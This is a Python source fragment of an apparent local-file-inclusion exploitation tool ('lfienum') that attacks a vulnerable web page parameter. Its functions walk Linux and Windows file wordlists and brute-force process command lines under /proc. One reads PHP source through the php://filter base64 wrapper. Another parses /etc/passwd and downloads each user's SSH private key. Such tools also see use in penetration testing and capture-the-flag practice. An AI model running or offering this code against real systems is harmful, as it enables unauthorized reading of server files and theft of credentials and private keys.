def LinEnum():

	for possible_lfi_file in linux_lfi_wordlist:

		resp = requests.get(url + possible_lfi_file, verify=True, headers=headers, allow_redirects=False)

		if resp.status_code == 200 or resp.status_code == 301 or resp.status_code == 302:

			content = resp.text
			clean_content = re.sub('<[^<]+?>', '', content)

			if len(clean_content) > 0:

				print ("[\033[1;32m" + url + possible_lfi_file + "\033[0m]")
				print(clean_content)

def WinEnum():

	for possible_lfi_file in windows_lfi_wordlist:

		resp = requests.get(url + possible_lfi_file, verify=True, headers=headers, allow_redirects=False)

		if resp.status_code == 200 or resp.status_code == 301 or resp.status_code == 302:

			content = resp.text
			clean_content = re.sub('<[^<]+?>', '', content)

			if len(clean_content) > 0:

				print ("[\033[1;32m" + url + possible_lfi_file + "\033[0m]")
				print(clean_content)

def PID():

	print ("Bruteforcing 0-999 PIDS (please ignore junk data)")
	pid_count=1000

	for pid in range(pid_count):

		resp = requests.get(url + '/proc/' + str(pid) + '/cmdline', verify=True, headers=headers, allow_redirects=False)

		if resp.status_code == 200 or resp.status_code == 301 or resp.status_code == 302:

			content = resp.text
			clean_content = re.sub('<[^<]+?>', '', content)

			if len(clean_content) > 0:

				print ( "\033[1;32mPID " + str(pid) + ":\033[0m " + clean_content.strip("\n"))

def Wrapper():

	resp = requests.get(url + 'php://filter/convert.base64-encode/resource=' + sys.argv[3], verify=True, headers=headers, allow_redirects=False)
	content = resp.text
	clean_content = re.sub('<[^<]+?>', '', content)
	print (clean_content.strip("\n"))
	try:
		print( "\n" + base64.b64decode(clean_content).decode('utf-8'))
	except UnicodeDecodeError:
		print ('\n\n\033[1;31mSomething went wrong while decoding base64. Junk data? Try decoding manually\033[0m\n')
		sys.exit(1)
	
def ID_RSA():

	resp = requests.get(url + '/etc/passwd')
	cleanresponse = resp.text

	for fetch_users in cleanresponse.split('\n'):

		if ':/home/' in fetch_users:

			fetch_id_rsa = requests.get(url + '/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa', verify=True, headers=headers, allow_redirects=False)

			if fetch_id_rsa.status_code == 200 or resp.status_code == 301 or resp.status_code == 302:

				content = fetch_id_rsa.text
				clean_content = re.sub('<[^<]+?>', '', content)

				if len(fetch_id_rsa.text) > 0:

					print ('\n\033[1;33m[SSH ID_RSA KEY]\033[0m\n' + fetch_users.split(":")[0].strip() + ' key ' + 'from ' + url + '/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa\n')
					print (clean_content)


def Wordlist():

	with open(sys.argv[3], 'r') as custom_wordlist:

		for possible_lfi_file in custom_wordlist:

			resp = requests.get(url + possible_lfi_file.strip(), verify=True, headers=headers, allow_redirects=False)

			if resp.status_code == 200 or resp.status_code == 301 or resp.status_code == 302:

				content = resp.text
				clean_content = re.sub('<[^<]+?>', '', content)

				if len(clean_content) > 0:

					print ("[\033[1;32m" + url + possible_lfi_file.strip() + "\033[0m]")
					print(clean_content)


# Args handlers
if len(sys.argv) == 2:

	try:
		LinEnum()
		ID_RSA()
	except:
		sys.exit(1)
	try:
		WinEnum()
	except:
		sys.exit(1)

	sys.exit(1)

try:
	if sys.argv[2] == '--key' or sys.argv[2] == '-k':
		ID_RSA()

except IndexError:

	sys.exit(1)

try:
	if sys.argv[2] == '--wordlist' or sys.argv[2] == '-w':
		Wordlist()

except IndexError:

	print ("wordlist usage example:")
	print ("python3 lfienum http://ghost.server/index.php?page= --wordlist wordlist.txt")
	sys.exit(1)

try:

	if sys.argv[2] == "--pid":
		PID()

except IndexError:

	sys.exit(1)

try:
	if sys.argv[2] == '--wrapper':
		Wrapper()

except IndexError:

	print ("wrapper argument usage example:")
	print ("python3 lfienum http://ghost.server/index.php?page= --wrapper index.php")
	sys.exit(1)
